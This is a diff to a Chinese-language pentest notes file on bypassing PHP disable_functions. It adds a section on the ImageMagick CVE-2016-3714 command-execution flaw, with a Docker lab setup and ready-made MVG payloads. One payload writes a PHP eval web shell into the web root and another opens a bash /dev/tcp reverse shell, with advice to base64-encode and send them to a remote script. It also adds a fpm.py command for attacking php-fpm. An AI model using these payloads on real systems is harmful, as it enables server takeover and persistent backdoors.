@@ -183,6 +183,68 @@ mail('','','','');
 ![](img/3.png)
 
 
+### 利用 ImageMagick 命令执行漏洞 bypass disable_functions
+
+利用 [ImageMagick 命令执行漏洞（CVE-2016–3714）](https://github.com/Medicean/VulApps/tree/master/i/imagemagick/1)
+
+> ImageMagick是一款开源图片处理库，支持 PHP、Ruby、NodeJS 和 Python 等多种语言，使用非常广泛。包括 PHP imagick、Ruby rmagick 和 paperclip 以及 NodeJS imagemagick 等多个图片处理插件都依赖它运行。
+
+**获取环境**
+
+拉取镜像到本地
+
+`$ docker pull medicean/vulapps:i_imagemagick_1`
+
+启动环境
+
+`$ docker run -d -p 8000:80 --name=i_imagemagick_1 medicean/vulapps:i_imagemagick_1`
+
+ > -p 8000:80 前面的 8000 代表物理机的端口，可随意指定。
+
+- 使用与利用
+- 本地测试
+
+在容器中 `/poc.png` 文件内容如下：
+```
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://evalbug.com/"|ls -la")'
+pop graphic-context
+```
+
+在物理机上直接执行下面命令验证漏洞：
+
+`$ docker exec i_imagemagick_1 convert /poc.png 1.png`
+
+或进入 docker容器 shell 中执行：
+
+`$ convert /poc.png 1.png`
+
+如果看到 `ls -al 命令成功执行`，则存在漏洞。
+
+**远程命令执行测试和使用POC**
+
+远程命令执行无回显，可通过写文件或者`反弹 shell` 来验证漏洞存在。
+
+- 写一句话到网站根目录下：
+    ```bash
+    push graphic-context
+    viewbox 0 0 640 480
+    fill 'url(https://xxxxx.com/1.jpg"|echo \'<?php eval($_POST[\'ant\']);?>\' > shell.php")'
+    pop graphic-context
+    ```
+
+- 反弹 shell:
+    ```bash
+    push graphic-context
+    viewbox 0 0 640 480
+    fill 'url(https://example.com/1.jpg"|bash -i >& /dev/tcp/192.168.1.101/2333 0>&1")'
+    pop graphic-context
+    ```
+将上述两个 `Exp` 经过 `base64 编码`后发送到远程 poc.php，querystring 的 key 为 img。
+
+
+
 
 **攻击 php-fpm/FastCGI bypass disable_functions 绕过**
 
@@ -191,8 +253,12 @@ php-fpm是实现FastCGI协议的一个介于webserver(如nginx)和php解释器�
 
 PHP5.3 版本之后，PHP-FPM 是内置于 PHP 的，一般来说，尤其是在高并发的情况下，nginx + PHP-FPM 的组合要比 apache + mod_php 好很多.
 
-方法一：
 使用 `fpm.py` 脚本:https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75
+
+本地测试
+```
+python fpm.py -c '<?php echo `id`;exit;?>' -p 9999 127.0.0.1 /var/www/html/test.php
+```
 
 
 
@@ -241,6 +307,24 @@ echo shellshock($_REQUEST["cmd"]);
 ```
 
 命令:`?cmd=/usr/bin/id`
+
+### FFI 绕过 disable_functions
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 ### ECShop <= 2.x/3.6.x/3.0.x 版本远程代码执行高危漏洞利用
